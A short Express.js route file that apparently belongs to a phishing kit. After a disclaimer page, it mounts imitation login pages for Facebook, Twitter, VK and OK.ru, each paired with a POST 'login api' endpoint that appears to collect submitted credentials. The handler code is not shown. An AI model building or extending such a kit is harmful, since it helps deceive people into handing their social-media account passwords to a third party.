module.exports = function(app) {

  // for DISCLAIMER
  app.get('/', require('./disclaimer').get);

  // for facebook.com
  // login page
  app.get('/fb', require('./fb').get);
  // login api
  app.post('/fblogin', require('./fb').post);

  // for twitter.com
  // main page
  app.get('/tw', require('./tw').get);
  // login api
  app.post('/twlogin', require('./tw').post);

  // for vk.ru
  // main page
  app.get('/vk', require('./vk').get);
  // login api
  app.post('/vklogin', require('./vk').post);

  // for OK.RU
  // main page
  app.get('/ok', require('./ok').get);
  // login api
  app.post('/oklogin', require('./ok').post);
}
